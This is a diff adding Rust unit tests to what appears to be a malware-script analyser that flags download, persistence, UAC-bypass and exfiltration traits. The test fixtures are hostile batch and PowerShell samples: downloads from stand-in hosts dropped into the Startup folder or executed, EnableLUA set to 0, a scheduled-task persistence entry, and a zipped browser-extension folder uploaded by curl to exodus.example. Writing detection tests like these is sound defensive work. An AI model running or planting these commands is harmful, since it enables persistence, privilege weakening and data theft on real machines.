@@ -2472,6 +2472,26 @@ move "%USERPROFILE%\Downloads\startupppp.bat" "%APPDATA%\Microsoft\Windows\Start
     }
 
     #[test]
+    fn powershell_download_moved_into_startup_folder_emits_url_argument() {
+        let script = br#"@echo off
+powershell -Command "& { Invoke-WebRequest -Uri 'https://persist.example/startupppp.bat' -OutFile 'C:\Users\puncher\Downloads\startupppp.bat' }"
+move "C:\Users\puncher\Downloads\startupppp.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.ends_with(r"Microsoft\Windows\Start Menu\Programs\Startup\startupppp.bat")
+                        && url == "https://persist.example/startupppp.bat"
+            )),
+            "PowerShell download moved into Startup was not linked to URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn defender_evasion_traits_detected() {
         // Common AV-evasion patterns: Add-MpPreference exclusion,
         // Set-MpPreference -DisableRealtimeMonitoring $true, sc stop
@@ -20922,6 +20942,28 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn powershell_cp_positional_preserves_download_provenance() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-cp-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
+powershell -Command "cp '%TEMP%\downloaded.ps1' '%TEMP%\copied.ps1'"
+powershell -NoProfile -File "%TEMP%\copied.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && cmd.contains("copied.ps1")
+                        && url == "https://ps-cp-provenance.example/stage.ps1"
+            )),
+            "PowerShell cp script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_positional_url_after_flags_extracted() {
         let ps = r#"IWR -useb 'https://iwr.example/payload.js' -outf $env:TEMP\payload.js"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
@@ -37698,6 +37740,22 @@ powershell -Command "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance"
     }
 
     #[test]
+    fn powershell_positional_set_itemproperty_enablelua_emits_uac_bypass_trait() {
+        let script = br#"powershell.exe Set-ItemProperty HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system EnableLUA 0
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UacBypass { technique } if technique == "uac-enablelua-disabled"
+            )),
+            "missing positional Set-ItemProperty EnableLUA UacBypass: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn expanded_persistence_probe_cleanup_and_recovery_signals_emit_traits() {
         let script = br#"powershell.exe Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -Value 0
 powershell -Command "Test-NetConnection -ComputerName c2.example -Port 443"
@@ -38068,6 +38126,22 @@ powershell -Command "tracert route-wrapper.example"
                 Trait::UacBypass { technique } if technique == "uac-enablelua-disabled"
             )),
             "missing sp alias EnableLUA UacBypass: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_positional_sp_alias_enablelua_emits_uac_bypass_trait() {
+        let script = br#"powershell.exe sp HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system EnableLUA 0
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UacBypass { technique } if technique == "uac-enablelua-disabled"
+            )),
+            "missing positional sp alias EnableLUA UacBypass: {:?}",
             report.traits
         );
     }
@@ -38648,6 +38722,26 @@ powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%USERPROFILE%\Desk
                         && command == "cmd.exe /c calc.exe"
             )),
             "short PowerShell scheduled-task parameters missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_multiline_scheduled_task_action_variable_emits_persistence_trait() {
+        let script = br#"$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c calc.exe'
+Register-ScheduledTask -TaskName Updater -Action $a -Force
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "Updater"
+                        && command == "cmd.exe /c calc.exe"
+            )),
+            "multi-line PowerShell scheduled-task action missing: {:?}",
             report.traits
         );
     }
@@ -39956,6 +40050,31 @@ for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do set "resp
                     if src == "https://exodus.example/files/upload.php" && dst.is_none()
             )),
             "known URL variable in skipped FOR/F curl was not rescued: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn powershell_compress_archive_destination_allows_later_if_exist_upload() {
+        let report = analyze(
+            br#"set "uploadUrl=https://exodus.example/files/upload.php"
+set "zipFile=%TEMP%\BrowserExtensionSettings.zip"
+powershell -command "Compress-Archive -Path '%TEMP%\ArchiveContents\*' -DestinationPath '%zipFile%'"
+if exist "%zipFile%" (
+    for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do set "response=%%a"
+)
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
+            )),
+            "Compress-Archive destination did not make later curl upload branch reachable: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
